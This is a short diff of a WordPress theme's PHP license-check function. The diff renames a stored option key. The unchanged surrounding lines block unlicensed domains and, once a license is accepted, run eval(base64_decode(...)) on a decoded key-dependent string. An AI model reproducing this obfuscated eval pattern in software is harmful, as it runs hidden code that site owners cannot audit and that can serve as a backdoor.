@@ -27,8 +27,8 @@ function tin_authorize(){
 	$server = strtolower($_SERVER['SERVER_NAME']);
 	$server_arr = explode('.', $server);
 	if(count($server_arr)==3){$server = $server_arr[1].'.'.$server_arr[2];}
-	if(get_option('_wp_tin_authorize')){
-		$info = get_option('_wp_tin_authorize');
+	if(get_option('_wp_tin_authorize2')){
+		$info = get_option('_wp_tin_authorize2');
 		$info_arr = json_decode($info);
 		if(($info_arr->active==1)&&($info_arr->time+3600*24*7>time())){
 			$post = 0;
@@ -58,7 +58,7 @@ function tin_authorize(){
 			'active' => 0,
 			'key' => ''
 		);
-		update_option('_wp_tin_authorize',json_encode($arr));
+		update_option('_wp_tin_authorize2',json_encode($arr));
 		wp_die('主题未授权本域名，如果你购买了本主题，请先<a href="http://www.zhiyanblog.com/cdn/tinection/authorize.php" target="_blank" title="验证授权">验证授权</a>，并配置主题根目录tin-config.php中的相关授权参数。','域名未授权');
 	}else{
 		$arr = array(
@@ -66,7 +66,7 @@ function tin_authorize(){
 			'active' => 1,
 			'key' => $key
 		);
-		update_option('_wp_tin_authorize',json_encode($arr));
+		update_option('_wp_tin_authorize2',json_encode($arr));
 		eval(base64_decode(authcode($code,'DECODE',$key)));
 	}
 }
